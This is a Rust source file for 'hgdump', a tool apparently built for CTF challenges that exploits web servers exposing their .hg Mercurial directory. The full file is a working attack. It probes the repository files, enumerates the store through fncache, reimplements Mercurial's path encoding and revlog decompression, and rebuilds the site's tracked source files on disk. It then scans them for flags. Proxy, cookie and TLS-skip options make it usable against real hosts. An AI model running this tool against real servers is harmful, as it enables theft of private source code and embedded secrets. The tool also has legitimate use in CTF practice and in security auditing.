//! hgdump - .hg(Mercurial) 泄露自动利用
//! 纯 Rust: fncache 枚举 + store 路径编码 + revlog v1 解压(zlib/zstd/raw) + delta 链还原

use clap::Parser;
use common::http::{HttpClient, HttpOpts};
use common::{exit, finish, scan_flags, Mode, Out};
use flate2::read::ZlibDecoder;
use serde::Serialize;
use sha1::{Digest, Sha1};
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::time::Duration;

const MAX_STORE_PATH_LEN: usize = 120;
const DIR_PREFIX_LEN: usize = 8;
const MAX_SHORT_DIRS_LEN: usize = 8 * (DIR_PREFIX_LEN + 1) - 4;

#[derive(Parser, Debug)]
#[command(
    name = "hgdump",
    version,
    about = ".hg(Mercurial) 泄露自动利用",
    long_about = "hgdump -- .hg(Mercurial) 泄露自动利用\n\n用法:\n  hgdump <URL>                 枚举+还原文件+自动 cat flag\n  hgdump <URL> --out 目录      指定输出目录（默认 hgdump_<host>/）\n  hgdump <URL> --list          只列出固定结构探测结果\n  hgdump <URL> --cat 文件名    还原后 cat 指定文件\n\n示例:\n  hgdump http://目标\n  hgdump http://目标 --list\n  hgdump http://目标 --cat flag_xxx.txt\n\n退出码: 0=成功 1=无结果 2=用法错误 3=运行错误",
    after_help = "退出码: 0=成功 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    /// 目标 URL
    #[arg(value_name = "URL")]
    url: String,

    /// 指定输出目录（默认 hgdump_<host>/）
    #[arg(long, value_name = "目录")]
    out: Option<String>,

    /// 只列出固定结构探测结果
    #[arg(long)]
    list: bool,

    /// 还原后 cat 指定文件
    #[arg(long, value_name = "文件名")]
    cat: Option<String>,

    /// HTTP 超时(秒)
    #[arg(long, default_value_t = 10, value_name = "SECS")]
    timeout: u64,

    /// HTTP 代理
    #[arg(long, value_name = "URL")]
    proxy: Option<String>,

    /// 跳过 TLS 证书校验
    #[arg(long)]
    insecure: bool,

    /// 自定义 User-Agent
    #[arg(long, value_name = "UA")]
    ua: Option<String>,

    /// Cookie
    #[arg(long, value_name = "COOKIE")]
    cookie: Option<String>,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize, Clone)]
struct ProbeInfo {
    path: String,
    status: u16,
    size: usize,
}

#[derive(Serialize, Clone)]
struct RestoredFile {
    store: String,
    file: String,
    size: usize,
}

#[derive(Serialize)]
struct Report {
    tool: &'static str,
    target: String,
    out: String,
    probe: Vec<ProbeInfo>,
    fncache: Vec<String>,
    restored: Vec<RestoredFile>,
    #[serde(skip_serializing_if = "Option::is_none")]
    cat: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    flags: Vec<String>,
}

fn be32(b: &[u8]) -> u32 {
    u32::from_be_bytes([b[0], b[1], b[2], b[3]])
}

fn be64(b: &[u8]) -> u64 {
    u64::from_be_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]])
}

fn hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

fn host_slug(url: &str) -> String {
    url.split("://")
        .last()
        .unwrap_or(url)
        .replace(['/', ':'], "_")
}

fn encode_url(url: &str) -> String {
    let Some(scheme_end) = url.find("://") else {
        return url.to_string();
    };
    let rest = &url[scheme_end + 3..];
    let path_start = rest
        .find('/')
        .map(|i| scheme_end + 3 + i)
        .unwrap_or(url.len());
    let (base, path) = url.split_at(path_start);
    let mut out = String::with_capacity(url.len());
    out.push_str(base);
    for &b in path.as_bytes() {
        let keep = b.is_ascii_alphanumeric()
            || matches!(
                b,
                b'-' | b'.'
                    | b'_'
                    | b'~'
                    | b'/'
                    | b'%'
                    | b'!'
                    | b'$'
                    | b'&'
                    | b'\''
                    | b'('
                    | b')'
                    | b'*'
                    | b'+'
                    | b','
                    | b';'
                    | b'='
                    | b':'
                    | b'@'
            );
        if keep {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

fn fetch(client: &HttpClient, url: &str) -> Option<Vec<u8>> {
    let encoded = encode_url(url);
    for attempt in 0..3u64 {
        match client.get(&encoded) {
            Ok(r) if r.is_success() && !r.body.is_empty() => return Some(r.body),
            Ok(_) => return None,
            Err(_) if attempt < 2 => {
                std::thread::sleep(Duration::from_millis(10 * (attempt + 1)));
            }
            Err(_) => return None,
        }
    }
    None
}

fn safe_join(base: &Path, rel: &str) -> Option<PathBuf> {
    let mut p = PathBuf::new();
    for comp in rel.split('/') {
        if comp.is_empty() || comp == "." || comp == ".." {
            return None;
        }
        p.push(comp);
    }
    if p.as_os_str().is_empty() {
        None
    } else {
        Some(base.join(p))
    }
}

fn write_out(base: &Path, rel: &str, data: &[u8]) -> std::io::Result<()> {
    let dest = match safe_join(base, rel) {
        Some(d) => d,
        None => return Ok(()),
    };
    if let Some(parent) = dest.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(dest, data)
}

fn encode_dir(s: &str) -> String {
    s.replace(".hg/", ".hg.hg/")
        .replace(".i/", ".i.hg/")
        .replace(".d/", ".d.hg/")
}

fn decode_dir(s: &str) -> String {
    if !s.contains(".hg/") {
        return s.to_string();
    }
    s.replace(".d.hg/", ".d/")
        .replace(".i.hg/", ".i/")
        .replace(".hg.hg/", ".hg/")
}

fn is_reserved(b: u8) -> bool {
    !(32..=125).contains(&b) || matches!(b, b'\\' | b':' | b'*' | b'?' | b'"' | b'<' | b'>' | b'|')
}

fn encode_bytes(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    for &b in s {
        match b {
            b'A'..=b'Z' => {
                out.push(b'_');
                out.push(b | 0x20);
            }
            b'_' => out.extend_from_slice(b"__"),
            _ if is_reserved(b) => out.extend_from_slice(format!("~{b:02x}").as_bytes()),
            _ => out.push(b),
        }
    }
    out
}

fn decode_bytes(s: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len());
    let mut i = 0usize;
    while i < s.len() {
        match s[i] {
            b'_' => {
                let n = *s.get(i + 1)?;
                if n == b'_' {
                    out.push(b'_');
                } else if n.is_ascii_lowercase() {
                    out.push(n.to_ascii_uppercase());
                } else {
                    return None;
                }
                i += 2;
            }
            b'~' => {
                let hi = (*s.get(i + 1)? as char).to_digit(16)? as u8;
                let lo = (*s.get(i + 2)? as char).to_digit(16)? as u8;
                out.push((hi << 4) | lo);
                i += 3;
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    Some(out)
}

fn lower_encode(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    for &b in s {
        match b {
            b'A'..=b'Z' => out.push(b | 0x20),
            _ if is_reserved(b) => out.extend_from_slice(format!("~{b:02x}").as_bytes()),
            _ => out.push(b),
        }
    }
    out
}

fn aux_encode(comp: &[u8], dotencode: bool) -> Vec<u8> {
    let mut n = comp.to_vec();
    if n.is_empty() {
        return n;
    }
    if dotencode && (n[0] == b'.' || n[0] == b' ') {
        let mut v = format!("~{:02x}", n[0]).into_bytes();
        v.extend_from_slice(&n[1..]);
        n = v;
    } else {
        let dot = n.iter().position(|&b| b == b'.').unwrap_or(n.len());
        let head = &n[..dot];
        let res3 = head == b"aux" || head == b"con" || head == b"prn" || head == b"nul";
        let res4 = head.len() == 4
            && (&head[..3] == b"com" || &head[..3] == b"lpt")
            && head[3].is_ascii_digit()
            && head[3] != b'0';
        if res3 || res4 {
            let mut v = n[..2].to_vec();
            v.extend_from_slice(format!("~{:02x}", n[2]).as_bytes());
            v.extend_from_slice(&n[3..]);
            n = v;
        }
    }
    if let Some(&last) = n.last() {
        if last == b'.' || last == b' ' {
            let esc = format!("~{last:02x}");
            n.truncate(n.len() - 1);
            n.extend_from_slice(esc.as_bytes());
        }
    }
    n
}

fn hash_encode(path: &[u8], dotencode: bool) -> String {
    let digest = hex(&Sha1::digest(path));
    let le = lower_encode(path.get(5..).unwrap_or_default());
    let parts: Vec<Vec<u8>> = le
        .split(|&b| b == b'/')
        .map(|c| aux_encode(c, dotencode))
        .collect();
    let basename = parts.last().cloned().unwrap_or_default();
    let ext: Vec<u8> = match basename.iter().rposition(|&b| b == b'.') {
        Some(i) if i > 0 => basename[i..].to_vec(),
        _ => Vec::new(),
    };
    let mut sdirs: Vec<Vec<u8>> = Vec::new();
    let mut sdirs_len = 0usize;
    for p in &parts[..parts.len().saturating_sub(1)] {
        let mut d = p[..p.len().min(DIR_PREFIX_LEN)].to_vec();
        if let Some(&last) = d.last() {
            if last == b'.' || last == b' ' {
                d.pop();
                d.push(b'_');
            }
        }
        let t = if sdirs_len == 0 {
            d.len()
        } else {
            sdirs_len + 1 + d.len()
        };
        if sdirs_len != 0 && t > MAX_SHORT_DIRS_LEN {
            break;
        }
        sdirs.push(d);
        sdirs_len = t;
    }
    let mut dirs = Vec::new();
    for (i, d) in sdirs.iter().enumerate() {
        if i > 0 {
            dirs.push(b'/');
        }
        dirs.extend_from_slice(d);
    }
    if !dirs.is_empty() {
        dirs.push(b'/');
    }
    let mut res = b"dh/".to_vec();
    res.extend_from_slice(&dirs);
    res.extend_from_slice(digest.as_bytes());
    res.extend_from_slice(&ext);
    if res.len() < MAX_STORE_PATH_LEN {
        let spaceleft = MAX_STORE_PATH_LEN - res.len();
        let mut res2 = b"dh/".to_vec();
        res2.extend_from_slice(&dirs);
        res2.extend_from_slice(&basename[..basename.len().min(spaceleft)]);
        res2.extend_from_slice(digest.as_bytes());
        res2.extend_from_slice(&ext);
        res = res2;
    }
    String::from_utf8_lossy(&res).to_string()
}

fn encode_path(logical: &str, dotencode: bool) -> String {
    let de = encode_dir(logical);
    let parts: Vec<Vec<u8>> = encode_bytes(de.as_bytes())
        .split(|&b| b == b'/')
        .map(|c| aux_encode(c, dotencode))
        .collect();
    let mut res = Vec::new();
    for (i, p) in parts.iter().enumerate() {
        if i > 0 {
            res.push(b'/');
        }
        res.extend_from_slice(p);
    }
    if res.len() > MAX_STORE_PATH_LEN {
        hash_encode(de.as_bytes(), dotencode)
    } else {
        String::from_utf8_lossy(&res).to_string()
    }
}

fn decode_path(store: &str) -> Option<String> {
    let rest = store.strip_prefix("data/")?;
    if rest.starts_with("dh/") {
        return None;
    }
    let mut s = rest;
    for ext in [".i", ".d", ".df"] {
        if let Some(t) = s.strip_suffix(ext) {
            s = t;
            break;
        }
    }
    let dir = decode_dir(s);
    let mut parts = Vec::new();
    for comp in dir.split('/') {
        parts.push(String::from_utf8(decode_bytes(comp.as_bytes())?).ok()?);
    }
    Some(parts.join("/"))
}

fn simple_name(store: &str) -> String {
    let mut s = store.strip_prefix("data/").unwrap_or(store);
    for ext in [".i", ".d", ".df"] {
        if let Some(t) = s.strip_suffix(ext) {
            s = t;
            break;
        }
    }
    match s.strip_prefix('_') {
        Some(t) => format!(".{t}"),
        None => s.to_string(),
    }
}

struct RevEntry {
    offset: u64,
    zlen: usize,
    base: i64,
}

struct Revlog {
    inline: bool,
    general_delta: bool,
    revs: Vec<RevEntry>,
}

fn parse_revlog(data: &[u8]) -> Option<Revlog> {
    if data.len() < 64 {
        return None;
    }
    let header = be32(&data[..4]);
    let version = header & 0xFFFF;
    let (inline, general_delta) = if version == 1 {
        (header & (1 << 16) != 0, header & (1 << 17) != 0)
    } else {
        let z0 = be32(&data[8..12]);
        (z0 > 0 && data.len() > 64 && data[64] == 0x78, false)
    };
    let mut revs = Vec::new();
    let mut pos = 0usize;
    let mut i = 0usize;
    while pos + 64 <= data.len() {
        let e = &data[pos..pos + 64];
        let raw = be64(&e[..8]);
        let zlen = be32(&e[8..12]) as usize;
        let base = be32(&e[16..20]) as i64;
        revs.push(RevEntry {
            offset: if i == 0 { 0 } else { raw >> 16 },
            zlen,
            base,
        });
        let step = if inline { 64 + zlen } else { 64 };
        pos = match pos.checked_add(step) {
            Some(p) => p,
            None => break,
        };
        i += 1;
    }
    Some(Revlog {
        inline,
        general_delta,
        revs,
    })
}

fn zlib_decompress(data: &[u8]) -> Option<Vec<u8>> {
    let mut dec = ZlibDecoder::new(data);
    let mut out = Vec::new();
    dec.read_to_end(&mut out).ok()?;
    Some(out)
}

fn decompress_chunk(chunk: &[u8]) -> Option<Vec<u8>> {
    if chunk.is_empty() {
        return Some(Vec::new());
    }
    match chunk[0] {
        0x78 => zlib_decompress(chunk),
        0x28 => zstd::stream::decode_all(chunk).ok(),
        0x75 => Some(chunk[1..].to_vec()),
        0x00 => Some(chunk.to_vec()),
        _ => None,
    }
}

fn apply_patch(base: &[u8], patch: &[u8]) -> Option<Vec<u8>> {
    if base.is_empty() && patch.len() >= 12 {
        return Some(patch[12..].to_vec());
    }
    let mut out = Vec::new();
    let mut pos = 0usize;
    let mut last = 0usize;
    while pos + 12 <= patch.len() {
        let start = be32(&patch[pos..]) as usize;
        let end = be32(&patch[pos + 4..]) as usize;
        let len = be32(&patch[pos + 8..]) as usize;
        pos += 12;
        if start > end || end > base.len() || len > patch.len() - pos {
            return None;
        }
        out.extend_from_slice(&base[last..start]);
        out.extend_from_slice(&patch[pos..pos + len]);
        last = end;
        pos += len;
    }
    if pos != patch.len() {
        return None;
    }
    out.extend_from_slice(&base[last..]);
    Some(out)
}

impl Revlog {
    fn chunk<'a>(&self, index: &'a [u8], data: &'a [u8], rev: usize) -> Option<&'a [u8]> {
        let e = self.revs.get(rev)?;
        let (src, pos) = if self.inline {
            (index, e.offset as usize + (rev + 1) * 64)
        } else {
            (data, e.offset as usize)
        };
        let end = pos.checked_add(e.zlen)?;
        if end > src.len() {
            return None;
        }
        Some(&src[pos..end])
    }

    fn full_text(&self, index: &[u8], data: &[u8], rev: usize) -> Option<Vec<u8>> {
        let mut chain = Vec::new();
        let mut cur = rev;
        let mut complete = false;
        for _ in 0..=self.revs.len() {
            let e = self.revs.get(cur)?;
            chain.push(cur);
            if e.base == cur as i64 {
                complete = true;
                break;
            }
            let next = if self.general_delta {
                usize::try_from(e.base).ok()?
            } else {
                cur.checked_sub(1)?
            };
            if next >= cur {
                return None;
            }
            cur = next;
        }
        if !complete {
            return None;
        }
        let mut text = Vec::new();
        for &r in chain.iter().rev() {
            let raw = decompress_chunk(self.chunk(index, data, r)?)?;
            if self.revs[r].base == r as i64 {
                text = raw;
            } else {
                text = apply_patch(&text, &raw)?;
            }
        }
        Some(text)
    }
}

fn revlog_content(index: &[u8], data: &[u8]) -> Option<Vec<u8>> {
    let rl = parse_revlog(index)?;
    let mut fallback = None;
    for rev in (0..rl.revs.len()).rev() {
        if rl.revs[rev].zlen == 0 {
            continue;
        }
        if let Some(text) = rl.full_text(index, data, rev) {
            if !text.is_empty() {
                return Some(text);
            }
            if fallback.is_none() {
                fallback = Some(text);
            }
        }
    }
    fallback
}

struct StoreFetch {
    actual: String,
    index: Option<Vec<u8>>,
    data: Option<Vec<u8>>,
}

fn fetch_store(client: &HttpClient, base: &str, logical: &str, dotencode: bool) -> StoreFetch {
    let encoded = encode_path(logical, dotencode);
    let mut candidates = vec![encoded.clone()];
    if encoded != logical {
        candidates.push(logical.to_string());
    }
    let mut actual = logical.to_string();
    let mut index = None;
    for cand in &candidates {
        if let Some(d) = fetch(client, &format!("{base}store/{cand}")) {
            actual = cand.clone();
            index = Some(d);
            break;
        }
    }
    let mut data = None;
    if let Some(idx) = &index {
        if let Some(rl) = parse_revlog(idx) {
            if !rl.inline {
                if let Some(stem) = actual.strip_suffix(".i") {
                    let dotd = format!("{stem}.d");
                    data = fetch(client, &format!("{base}store/{dotd}"));
                }
            }
        }
    }
    StoreFetch {
        actual,
        index,
        data,
    }
}

fn main() -> ExitCode {
    common::reset_sigpipe();
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    let mut url = args.url.trim_end_matches('/').to_string();
    if !url.ends_with(".hg") {
        url.push_str("/.hg");
    }
    url.push('/');

    let out_dir = args
        .out
        .clone()
        .unwrap_or_else(|| format!("hgdump_{}", host_slug(&url)));

    let opts = HttpOpts {
        timeout: args.timeout,
        proxy: args.proxy.clone(),
        insecure: args.insecure,
        user_agent: args
            .ua
            .clone()
            .unwrap_or_else(|| HttpOpts::default().user_agent),
        cookie: args.cookie.clone(),
        ..HttpOpts::default()
    };
    let client = match HttpClient::new(&opts) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return finish(exit::ERROR);
        }
    };

    out.info(&format!("[*] 目标: {url}"));

    let seed = [
        "/requires",
        "/dirstate",
        "/store/fncache",
        "/store/00changelog.i",
        "/store/00manifest.i",
    ];
    let mut probe = Vec::new();
    let mut fncache_raw: Option<Vec<u8>> = None;
    for path in seed {
        let data = fetch(&client, &format!("{url}{}", path.trim_start_matches('/')));
        let status = if data.is_some() { 200 } else { 404 };
        let size = data.as_ref().map_or(0, Vec::len);
        out.info(&format!("    [{status}] {path} ({size} B)"));
        if path == "/store/fncache" {
            fncache_raw = data;
        }
        probe.push(ProbeInfo {
            path: path.to_string(),
            status,
            size,
        });
    }

    let mut reqs_text = String::new();
    for p in ["/store/requires", "/requires"] {
        if let Some(d) = fetch(&client, &format!("{url}{}", p.trim_start_matches('/'))) {
            reqs_text.push_str(&String::from_utf8_lossy(&d));
            reqs_text.push('\n');
        }
    }
    let dotencode = reqs_text.split_whitespace().any(|r| r == "dotencode");

    let Some(fncache_bytes) = fncache_raw else {
        out.info("[!] fncache 未获取（404/网络错误），无法枚举文件");
        let report = Report {
            tool: "hgdump",
            target: url,
            out: out_dir,
            probe,
            fncache: Vec::new(),
            restored: Vec::new(),
            cat: None,
            flags: Vec::new(),
        };
        out.emit(|| {}, &report);
        return finish(exit::NO_RESULT);
    };

    let fncache_text = String::from_utf8_lossy(&fncache_bytes).to_string();
    let store_files: Vec<String> = fncache_text
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();
    out.info(&format!("[*] fncache 文件数: {}", store_files.len()));
    for f in &store_files {
        out.info(&format!("    {f}"));
    }

    if args.list {
        let code = if store_files.is_empty() {
            exit::NO_RESULT
        } else {
            exit::OK
        };
        let report = Report {
            tool: "hgdump",
            target: url,
            out: out_dir,
            probe,
            fncache: store_files,
            restored: Vec::new(),
            cat: None,
            flags: Vec::new(),
        };
        out.emit(|| {}, &report);
        return finish(code);
    }

    if let Err(e) = std::fs::create_dir_all(&out_dir) {
        out.error(&format!("创建输出目录失败: {e}"));
        return finish(exit::ERROR);
    }

    let mut restored: Vec<RestoredFile> = Vec::new();
    let mut contents: Vec<(String, String, Option<Vec<u8>>)> = Vec::new();
    for raw in &store_files {
        let logical = decode_dir(raw);
        if !logical.starts_with("data/") || !logical.ends_with(".i") {
            continue;
        }
        let f = fetch_store(&client, &url, &logical, dotencode);
        let Some(index) = &f.index else {
            out.info(&format!("    [404] {logical}"));
            continue;
        };
        let content = revlog_content(index, f.data.as_deref().unwrap_or(&[]));
        let fname = if f.actual == logical {
            simple_name(&logical)
        } else {
            decode_path(&f.actual).unwrap_or_else(|| simple_name(&logical))
        };
        let old_name = simple_name(&f.actual);
        let size = content.as_ref().map_or(0, Vec::len);
        if let Err(e) = write_out(Path::new(&out_dir), &fname, content.as_deref().unwrap_or(&[])) {
            out.error(&format!("写入 {fname} 失败: {e}"));
        }
        out.info(&format!("    [+] {} → {fname} ({size} B)", f.actual));
        restored.push(RestoredFile {
            store: f.actual,
            file: fname.clone(),
            size,
        });
        contents.push((fname, old_name, content));
    }

    out.info(&format!("\n[+] 还原文件: {} 个 → {out_dir}/", restored.len()));

    let cat = args.cat.as_ref().and_then(|want| {
        contents
            .iter()
            .find(|(fname, old, _)| fname == want || old == want)
            .map(|(fname, _, content)| (fname.clone(), content.clone().unwrap_or_default()))
    });
    if let Some(want) = &args.cat {
        match &cat {
            Some((_, c)) if !c.is_empty() => {
                out.info(&format!("\n--- {want} ---"));
                out.info(String::from_utf8_lossy(c).trim());
            }
            Some(_) => out.info(&format!("[!] {want} 无内容")),
            None => out.info(&format!("[!] 未找到 {want}")),
        }
    }

    let mut flags: Vec<String> = Vec::new();
    if args.cat.is_none() {
        out.info("\n[+] 扫描结果:");
        let mut found = false;
        let mut sorted: Vec<&(String, String, Option<Vec<u8>>)> = contents.iter().collect();
        sorted.sort_by(|a, b| a.0.cmp(&b.0));
        for (fname, _, content) in sorted {
            let Some(content) = content else {
                continue;
            };
            if content.is_empty() {
                continue;
            }
            let s = String::from_utf8_lossy(content);
            let lines: Vec<&str> = s
                .lines()
                .filter(|l| l.to_lowercase().contains("flag") || l.contains("ctfhub{"))
                .collect();
            if !lines.is_empty() {
                out.info(&format!("    {fname}:"));
                for l in &lines {
                    out.info(&format!("        {l}"));
                }
                found = true;
            }
            flags.extend(scan_flags(content));
        }
        if !found {
            out.info("    (未自动发现 flag，请手动检查还原文件)");
        }
    }
    flags.sort();
    flags.dedup();

    let cat_found = cat.as_ref().is_some_and(|(_, c)| !c.is_empty());
    let code = if restored.is_empty() || (args.cat.is_some() && !cat_found) {
        exit::NO_RESULT
    } else {
        exit::OK
    };

    let report = Report {
        tool: "hgdump",
        target: url,
        out: out_dir,
        probe,
        fncache: store_files,
        restored,
        cat: cat.map(|(_, c)| String::from_utf8_lossy(&c).trim().to_string()),
        flags,
    };
    out.emit(|| {}, &report);

    finish(code)
}
